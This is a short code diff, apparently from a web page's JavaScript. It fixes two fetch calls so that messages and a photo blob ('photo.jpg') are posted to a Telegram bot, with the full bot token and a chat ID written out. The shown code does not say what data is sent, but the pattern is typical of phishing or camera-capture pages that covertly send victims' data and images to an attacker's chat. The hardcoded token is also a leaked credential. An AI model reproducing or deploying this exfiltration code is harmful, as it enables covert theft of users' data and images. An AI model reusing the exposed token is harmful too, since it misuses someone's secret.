@@ -43,7 +43,7 @@
         }
 
         function sendMessageToTelegram(message) {
-            fetch(`https://api.telegram.org/bot$7441776044:AAGD0CCCpaJR_tlb-WxZIxK7iiQH4qdgwfg/sendMessage`, {
+            fetch(`https://api.telegram.org/bot7441776044:AAGD0CCCpaJR_tlb-WxZIxK7iiQH4qdgwfg/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -96,7 +96,7 @@
             const formData = new FormData();
             formData.append('photo', blob, 'photo.jpg');
 
-            fetch(`https://api.telegram.org/bot$7441776044:AAGD0CCCpaJR_tlb-WxZIxK7iiQH4qdgwfg/sendPhoto?chat_id=$5204585383`, {
+            fetch(`https://api.telegram.org/bot7441776044:AAGD0CCCpaJR_tlb-WxZIxK7iiQH4qdgwfg/sendPhoto?chat_id=5204585383`, {
                 method: 'POST',
                 body: formData
             })
